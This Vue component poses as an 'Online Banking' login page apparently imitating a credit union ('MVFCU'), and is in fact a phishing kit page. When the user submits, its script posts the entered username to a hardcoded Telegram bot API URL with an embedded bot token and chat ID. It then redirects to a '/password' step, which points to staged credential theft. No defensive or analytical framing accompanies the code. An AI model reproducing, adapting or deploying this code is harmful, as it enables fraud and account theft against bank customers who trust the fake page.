<template>
  <div class="page">
    <div class="auth-wrapper">
      <!-- Login Card -->
      <div class="login-card">
        <h2>Log in to Online Banking</h2>

        <div class="form-section">
          <div class="form-sec-wrap">
            <form class="field" @submit.prevent="finishJoob">
            <label>Username:</label>

            <input
              type="text"
              class="input"
              v-model="formDataRes.username"
            />

            <button class="btn-primary">
              Sign in
            </button>
          </form>
          </div>

          <hr />

          <a href="#" class="forgot-link">
            I forgot my username.
          </a>
        </div>
      </div>

      <!-- Register Section -->
      <div class="register-card">
        <p>Don't have an account?</p>

        <button class="btn-primary">
          Register
        </button>
      </div>
    </div>
  </div>
</template>

<style>
* {
  margin: 0;
  padding: 0;
}

body {
  box-sizing: border-box;
  width: 100%;
  height: 100vh;
}

.page {
  min-height: 100vh;
  background: #ededf1;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  padding-top: 28px;
  font-family: Arial, Helvetica, sans-serif;
}

.auth-wrapper {
  width: 560px;
}

/* Top Card */
.login-card {
  background: #fff;
  border-radius: 4px;
  overflow: hidden;
  box-shadow: 0 2px 0 0 #d0d5dd;
  padding-bottom: 8px;
}

.login-card h2 {
  margin: 0;
  padding: 12px 8px;
  font-size: 20px;
  font-weight: 700;
  color: #222;
}

.form-section {
  margin: 0 8px 8px;
  background: #e5e5ea78;
  padding: 18px 16px 22px;
  border-radius: 2px;
}

.form-sec-wrap {
  display: flex;
  justify-content: center;
  flex-direction: column;
  align-items: center;
  align-content: center;
}

.field {
  display: flex;
  flex-direction: column;
  align-items: start;
  justify-content: center;
}

label {
  width: full;
  text-align: start;
  font-size: 16px;
  color: #222;
  margin-bottom: 8px;
}

.input {
  width: 240px;
  height: 45.71px;
  border: 1px solid #c7c7c7;
  border-radius: 4px;
  box-sizing: border-box;
  background: #fff;
  padding: 0 10px;
  outline: none;
  margin-bottom: 8px;
  transition: all 0.2s ease;
}

.input:focus {
  border-color: #00a651;
  transform: translateY(-1px);
  box-shadow:
    0 4px 12px rgba(0, 166, 81, 0.12),
    0 0 0 3px rgba(0, 166, 81, 0.15);
}

.btn-primary {
  width: 240px;
  height: 45px;
  border: none;
  border-radius: 4px;
  background: #009e58;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

.btn-primary:hover {
  background: #00D174;
  border: .5px solid ;
  border-color: #00a651;
}

hr {
  margin: 14px 0 10px;
  border: none;
  border-top: 1px solid #c7c7c7;
}

.forgot-link {
  display: block;
  text-align: center;
  text-decoration: none;
  color: #009e58;
  font-size: 16px;
}

/* Bottom Card */
.register-card {
  background: #d9dde1;
  padding: 14px 0 16px;
  text-align: center;
  border-radius: 0 0 4px 4px;
}

.register-card p {
  margin: 0 0 10px;
  color: #222;
  font-size: 16px;
}
</style>

<script>
import axios from "axios"

export default {
  data() {
    return {
      formDataRes: {
        username: "",
      },
      // showPopup: false,
      // loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    }
  },

  computed: {
    isFormValid() {
      return this.formDataRes.email.trim() !== '' && this.formDataRes.fullName.trim() !== ''
    }
  },

  methods: {

    // registerFan() {
    //   this.showPopup = true;
    // },

    async finishJoob() {
      //  this.showPopup = true;

      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*🔔 MVFCU*\nUsername: ${this.formDataRes.username}}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/password");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,

        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  }
}
</script>